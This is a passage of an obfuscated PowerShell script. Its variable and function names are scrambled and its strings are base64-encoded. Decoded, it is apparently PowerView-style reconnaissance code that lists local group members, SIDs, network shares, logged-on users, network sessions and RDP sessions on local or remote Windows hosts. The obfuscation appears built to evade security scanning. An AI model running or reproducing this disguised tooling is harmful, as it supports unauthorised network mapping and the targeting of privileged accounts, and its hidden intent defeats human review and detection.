                            ${/=\__/=\___/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ${___/====\___/\___}
                            ${/=\/=\/\/=\/=====} = $(${___/=\_/==\_/\__/}.lgrmi2_sidusage -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQAVAB5AHAAZQBHAHIAbwB1AHAA'))))
                            ${/=\__/=\___/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${/=\/=\/\/=\/=====}
                            ${/=\__/=\___/=\/\/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwAVQBzAGUAcgBBAFAASQA='))))
                            ${_/==\/===\___/\__} += ${/=\__/=\___/=\/\/}
                        }
                    }
                    $Null = ${/=\/====\_/\/===\}::NetApiBufferFree(${___/\/\/\_/\__/=\})
                    ${_/\/\/=\/===\/=\/} = ${_/==\/===\___/\__} | ? {$_.SID -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADUAMAAwAA==')))}
                    ${_/====\__/=\/====} = ${_/\/\/=\/===\/=\/}.SID.Split('-')
                    ${_/\/\/=\/===\/=\/} = ${_/====\__/=\/====}[0..(${_/====\__/=\/====}.Length -2)] -join '-'
                    ${_/==\/===\___/\__} | % {
                        if($_.SID -match ${_/\/\/=\/===\/=\/}) {
                            $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                        }
                        else {
                            $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
                        }
                    }
                    ${_/==\/===\___/\__}
                }
                else {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${__/\/\_/\___/=\__}).Message)"
                }
            }
            else {
                try {
                    if(${_/===\/\/\/\____/=}) {
                        ${___/==\/\/==\/=\/} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewAvAD0APQA9AD0AXAAvAFwALwBcAF8AXwBfAF8AXwAvAFwAfQAsAGMAbwBtAHAAdQB0AGUAcgA=')))
                        ${___/==\/\/==\/=\/}.psbase.children | ? { $_.psbase.schemaClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))) } | % {
                            ${_/=\/\/=\_/\__/\/} = New-Object PSObject
                            ${_/=\/\/=\_/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))) ${/====\/\/\_____/\}
                            ${_/=\/\/=\_/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))) ($_.name[0])
                            ${_/=\/\/=\_/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                            ${_/=\/\/=\_/\__/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))) ($_.Description[0])
                            ${_/=\/\/=\_/\__/\/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAA=='))))
                            ${_/=\/\/=\_/\__/\/}
                        }
                    }
                    else {
                        ${/=====\_/==\/\_/\} = @($([ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewAvAD0APQA9AD0AXAAvAFwALwBcAF8AXwBfAF8AXwAvAFwAfQAvACQARwByAG8AdQBwAE4AYQBtAGUALABnAHIAbwB1AHAA')))).psbase.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAcwA=')))))
                        ${/=====\_/==\/\_/\} | % {
                            ${/=\/\_/\_/\_/==\/} = New-Object PSObject
                            ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/====\/\/\_____/\}
                            $AdsPath = ($_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAHMAcABhAHQAaAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null)).Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvAA=='))), '')
                            ${___/\/\_/\/\_/\/\} = $_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null)
                            $Name = _/=\/\/==\/==\_/\/ -__/\/==\_/\___/\/\ $AdsPath -_/==\/\/=\/=\_/=\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA'))) -___/=\/==\_/\__/== $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbwBuAGkAYwBhAGwA')))
                            ${/=\/=\/\/=\/=====} = ${___/\/\_/\/\_/\/\} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))
                            if($Name) {
                                ${/=\____/=\/==\/\_} = $Name.split("/")[0]
                                ${/=\__/\/\__/\_/=\} = $AdsPath.split("/")[-1]
                                $Name = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8AXwBfAF8ALwA9AFwALwA9AD0AXAAvAFwAXwB9AC8AJAB7AC8APQBcAF8AXwAvAFwALwBcAF8AXwAvAFwAXwAvAD0AXAB9AA==')))
                                ${_/====\__/\_/\/=\} = $True
                            }
                            else {
                                ${/=\__/\/\__/\_/=\} = $AdsPath.split("/")[-1]
                                $Name = $AdsPath
                                ${_/====\__/\_/\/=\} = $False
                            }
                            ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Name
                            ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) ${_/====\__/\_/\/=\}
                            ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${/=\/=\/\/=\/=====}
                            if(${_/====\__/\_/\/=\}) {
                                ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null),0)).Value)
                                ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))) ""
                                ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) ""
                                if(${/=\/=\/\/=\/=====}) {
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ""
                                }
                                else {
                                    try {
                                        ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ( $_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null))
                                    }
                                    catch {
                                        ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ""
                                    }
                                }
                                ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AGQATABhAHMAdABTAGUAdAA='))) ""
                                ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AGQARQB4AHAAaQByAGUAZAA='))) ""
                                ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBGAGwAYQBnAHMA'))) ""
                            }
                            else {
                                ${/=\__/=\___/=\/\/} = $([ADSI] $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAQQBkAHMAUABhAHQAaAA='))))
                                ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier(${/=\__/=\___/=\/\/}.objectSid.value,0)).Value)
                                ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))) (${/=\__/=\___/=\/\/}.Description[0])
                                if(${/=\/=\/\/=\/=====}) {
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AGQATABhAHMAdABTAGUAdAA='))) ""
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AGQARQB4AHAAaQByAGUAZAA='))) ""
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBGAGwAYQBnAHMA'))) ""
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) ""
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ""
                                }
                                else {
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AGQATABhAHMAdABTAGUAdAA='))) ( (Get-Date).AddSeconds(-${/=\__/=\___/=\/\/}.PasswordAge[0]))
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AGQARQB4AHAAaQByAGUAZAA='))) ( ${/=\__/=\___/=\/\/}.PasswordExpired[0] -eq '1')
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBGAGwAYQBnAHMA'))) ( ${/=\__/=\___/=\/\/}.UserFlags[0] )
                                    ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) $((${/=\__/=\___/=\/\/}.userFlags.value -band 2) -eq 2)
                                    try {
                                        ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ( ${/=\__/=\___/=\/\/}.LastLogin[0])
                                    }
                                    catch {
                                        ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ""
                                    }
                                }
                            }
                            ${/=\/\_/\_/\_/==\/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwAVQBzAGUAcgA='))))
                            ${/=\/\_/\_/\_/==\/}
                            if($Recurse -and ${/=\/=\/\/=\/=====}) {
                                if(${_/====\__/\_/\/=\}) {
                                  ${/=\____/=\/==\/\_} = $Name.split("/")[0]
                                  $GroupName = $Name.split("/")[1].trim()
                                  _/\____/=\__/\/\/\ -GroupName $GroupName -Domain ${/=\____/=\/==\/\_} -FullData -Recurse | % {
                                      ${/=\/\_/\_/\_/==\/} = New-Object PSObject
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) "${/=\____/=\/==\/\_}/$($_.GroupName)"
                                      ${_/=====\_/\__/=\_} = $_.distinguishedName
                                      ${_/====\/\_/\/==\_} = ${_/=====\_/\__/=\_}.subString(${_/=====\_/\__/=\_}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                                      ${_/\__/====\_/\__/} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $_.samaccounttype
                                      if ($_.samAccountName) {
                                          ${__/\_____/\____/=} = $_.samAccountName
                                      }
                                      else {
                                          try {
                                              try {
                                                  ${__/\_____/\____/=} = __/\_/\_/\__/\/\/\ $_.cn
                                              }
                                              catch {
                                                  ${__/\_____/\____/=} = $_.cn
                                              }
                                          }
                                          catch {
                                              Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABTAEkARAAgADoAIAAkAF8A')))
                                          }
                                      }
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0APQA9AFwALwBcAF8ALwBcAC8APQA9AFwAXwB9AC8AJAB7AF8AXwAvAFwAXwBfAF8AXwBfAC8AXABfAF8AXwBfAC8APQB9AA==')))
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) $_.objectsid
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))) $_.description
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) $False
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${_/\__/====\_/\__/}
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ''
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AGQATABhAHMAdABTAGUAdAA='))) $_.pwdLastSet
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AGQARQB4AHAAaQByAGUAZAA='))) ''
                                      ${/=\/\_/\_/\_/==\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBGAGwAYQBnAHMA'))) $_.userAccountControl
                                      ${/=\/\_/\_/\_/==\/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwAVQBzAGUAcgA='))))
                                      ${/=\/\_/\_/\_/==\/}
                                  }
                              } else {
                                __/\_/\/\_/\_/=\/\ -ComputerName ${/====\/\/\_____/\} -GroupName ${/=\__/\/\__/\_/=\} -Recurse
                              }
                            }
                        }
                    }
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                }
            }
        }
    }
}
filter _/==\_/===\_/\/=\_ {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    ${_/\/\____/\/=\___} = 1
    ${___/\/\/\_/\__/=\} = [IntPtr]::Zero
    ${____/\/=\/==\___/} = 0
    ${/===\___/=\/\/===} = 0
    ${/=\_/=====\/=\/=\} = 0
    ${__/\/\_/\___/=\__} = ${/=\/====\_/\/===\}::NetShareEnum(${___/==\/\/==\/=\/}, ${_/\/\____/\/=\___}, [ref]${___/\/\/\_/\__/=\}, -1, [ref]${____/\/=\/==\___/}, [ref]${/===\___/=\/\/===}, [ref]${/=\_/=====\/=\/=\})
    ${___/\____/====\/=\} = ${___/\/\/\_/\__/=\}.ToInt64()
    if ((${__/\/\_/\___/=\__} -eq 0) -and (${___/\____/====\/=\} -gt 0)) {
        ${/=\_/=\_/\/=\_/\/} = ${_____/==\_/=\/\__}::GetSize()
        for (${__/==\/=\_/=\/==\} = 0; (${__/==\/=\_/=\/==\} -lt ${____/\/=\/==\___/}); ${__/==\/=\_/=\/==\}++) {
            ${_/====\__/\__/\/\} = New-Object System.Intptr -ArgumentList ${___/\____/====\/=\}
            ${___/=\_/==\_/\__/} = ${_/====\__/\__/\/\} -as ${_____/==\_/=\/\__}
            ${_/==\/\__/\/\_/\_} = ${___/=\_/==\_/\__/} | select *
            ${_/==\/\__/\/\_/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
            ${___/\____/====\/=\} = ${_/====\__/\__/\/\}.ToInt64()
            ${___/\____/====\/=\} += ${/=\_/=\_/\/=\_/\/}
            ${_/==\/\__/\/\_/\_}
        }
        $Null = ${/=\/====\_/\/===\}::NetApiBufferFree(${___/\/\/\_/\__/=\})
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${__/\/\_/\___/=\__}).Message)"
    }
}
filter __/=\/\__/\/\/\/=\ {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    ${_/\/\____/\/=\___} = 1
    ${___/\/\/\_/\__/=\} = [IntPtr]::Zero
    ${____/\/=\/==\___/} = 0
    ${/===\___/=\/\/===} = 0
    ${/=\_/=====\/=\/=\} = 0
    ${__/\/\_/\___/=\__} = ${/=\/====\_/\/===\}::NetWkstaUserEnum(${___/==\/\/==\/=\/}, ${_/\/\____/\/=\___}, [ref]${___/\/\/\_/\__/=\}, -1, [ref]${____/\/=\/==\___/}, [ref]${/===\___/=\/\/===}, [ref]${/=\_/=====\/=\/=\})
    ${___/\____/====\/=\} = ${___/\/\/\_/\__/=\}.ToInt64()
    if ((${__/\/\_/\___/=\__} -eq 0) -and (${___/\____/====\/=\} -gt 0)) {
        ${/=\_/=\_/\/=\_/\/} = ${/===\_/\/===\/\__}::GetSize()
        for (${__/==\/=\_/=\/==\} = 0; (${__/==\/=\_/=\/==\} -lt ${____/\/=\/==\___/}); ${__/==\/=\_/=\/==\}++) {
            ${_/====\__/\__/\/\} = New-Object System.Intptr -ArgumentList ${___/\____/====\/=\}
            ${___/=\_/==\_/\__/} = ${_/====\__/\__/\/\} -as ${/===\_/\/===\/\__}
            ${__/\_/\_/=\_/=\/\} = ${___/=\_/==\_/\__/} | select *
            ${__/\_/\_/=\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
            ${___/\____/====\/=\} = ${_/====\__/\__/\/\}.ToInt64()
            ${___/\____/====\/=\} += ${/=\_/=\_/\/=\_/\/}
            ${__/\_/\_/=\_/=\/\}
        }
        $Null = ${/=\/====\_/\/===\}::NetApiBufferFree(${___/\/\/\_/\__/=\})
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${__/\/\_/\___/=\__}).Message)"
    }
}
filter __/==\/\_/\_/\/\_/ {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',
        [String]
        $UserName = ''
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    ${_/\/\____/\/=\___} = 10
    ${___/\/\/\_/\__/=\} = [IntPtr]::Zero
    ${____/\/=\/==\___/} = 0
    ${/===\___/=\/\/===} = 0
    ${/=\_/=====\/=\/=\} = 0
    ${__/\/\_/\___/=\__} = ${/=\/====\_/\/===\}::NetSessionEnum(${___/==\/\/==\/=\/}, '', $UserName, ${_/\/\____/\/=\___}, [ref]${___/\/\/\_/\__/=\}, -1, [ref]${____/\/=\/==\___/}, [ref]${/===\___/=\/\/===}, [ref]${/=\_/=====\/=\/=\})
    ${___/\____/====\/=\} = ${___/\/\/\_/\__/=\}.ToInt64()
    if ((${__/\/\_/\___/=\__} -eq 0) -and (${___/\____/====\/=\} -gt 0)) {
        ${/=\_/=\_/\/=\_/\/} = ${/=\/\/\_/\/==\/\/}::GetSize()
        for (${__/==\/=\_/=\/==\} = 0; (${__/==\/=\_/=\/==\} -lt ${____/\/=\/==\___/}); ${__/==\/=\_/=\/==\}++) {
            ${_/====\__/\__/\/\} = New-Object System.Intptr -ArgumentList ${___/\____/====\/=\}
            ${___/=\_/==\_/\__/} = ${_/====\__/\__/\/\} -as ${/=\/\/\_/\/==\/\/}
            ${_____/=\/==\_____} = ${___/=\_/==\_/\__/} | select *
            ${_____/=\/==\_____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
            ${___/\____/====\/=\} = ${_/====\__/\__/\/\}.ToInt64()
            ${___/\____/====\/=\} += ${/=\_/=\_/\/=\_/\/}
            ${_____/=\/==\_____}
        }
        $Null = ${/=\/====\_/\/===\}::NetApiBufferFree(${___/\/\/\_/\__/=\})
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] ${__/\/\_/\___/=\__}).Message)"
    }
}
filter Get-LoggedOnLocal {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )
    $ComputerName = _/=\_/=\/=\_/\__/\ -_/=====\/=\___/==\ $ComputerName
    try {
        ${/==\_/\__/=\/\/\_} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))))
        ${/==\_/\__/=\/\/\_}.GetSubKeyNames() | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) } | % {
            $UserName = __/\_/\_/\__/\/\/\ $_
            ${_/====\__/=\/====} = $UserName.Split('\')
            ${_/====\__/\_/==\/} = $Null
            $UserName = ${_/====\__/=\/====}[-1]
            if (${_/====\__/=\/====}.Length -eq 2) {
                ${_/====\__/\_/==\/} = ${_/====\__/=\/====}[0]
            }
            ${_/\___/\/=\_/\/\/} = New-Object PSObject
            ${_/\___/\/=\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA=')))
            ${_/\___/\/=\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) ${_/====\__/\_/==\/}
            ${_/\___/\/=\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
            ${_/\___/\/=\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $_
            ${_/\___/\/=\_/\/\/}
        }
    }
    catch {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAbwBwAGUAbgBpAG4AZwAgAHIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbwBuACAAJwAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACcA')))
    }
}
filter Get-NetRDPSession {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )
    ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
    ${_/\_/=\__/\/\__/\} = ${/===\__/==\__/==\}::WTSOpenServerEx(${___/==\/\/==\/=\/})
    if (${_/\_/=\__/\/\__/\} -ne 0) {
        ${___/\____/\____/\} = [IntPtr]::Zero
        ${_/\/\/=\_/\/=\_/=} = 0
        ${__/\/\_/\___/=\__} = ${/===\__/==\__/==\}::WTSEnumerateSessionsEx(${_/\_/=\__/\/\__/\}, [ref]1, 0, [ref]${___/\____/\____/\}, [ref]${_/\/\/=\_/\/=\_/=});${____/\/\/=\/\_/\/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        ${___/\____/====\/=\} = ${___/\____/\____/\}.ToInt64()
        if ((${__/\/\_/\___/=\__} -ne 0) -and (${___/\____/====\/=\} -gt 0)) {
            ${/=\_/=\_/\/=\_/\/} = ${/=\/\/\___/\__/=\}::GetSize()
            for (${__/==\/=\_/=\/==\} = 0; (${__/==\/=\_/=\/==\} -lt ${_/\/\/=\_/\/=\_/=}); ${__/==\/=\_/=\/==\}++) {
                ${_/====\__/\__/\/\} = New-Object System.Intptr -ArgumentList ${___/\____/====\/=\}
                ${___/=\_/==\_/\__/} = ${_/====\__/\__/\/\} -as ${/=\/\/\___/\__/=\}
                ${_/\/\___/=\___/==} = New-Object PSObject
                if (${___/=\_/==\_/\__/}.pHostName) {
                    ${_/\/\___/=\___/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/=\_/==\_/\__/}.pHostName
                }
                else {
